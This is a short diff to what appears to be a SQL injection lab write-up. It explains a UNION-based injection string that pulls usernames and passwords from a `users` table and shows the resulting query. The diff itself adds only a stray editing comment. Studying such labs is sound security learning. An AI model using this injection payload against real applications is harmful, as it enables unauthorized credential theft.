@@ -34,6 +34,8 @@ I know which table (`users`) contains the credentials (columns `username` and `p
 
 I use an invalid category so that no articles are found and only my output appears. The injection string is `X' UNION (SELECT username, password FROM users)--` to form the following query:
 
+// 📝 INSERT AFTER GIFTS
+
 ```sql
 SELECT * FROM someTable WHERE category = 'X' UNION (SELECT username, password FROM users)--
 ```
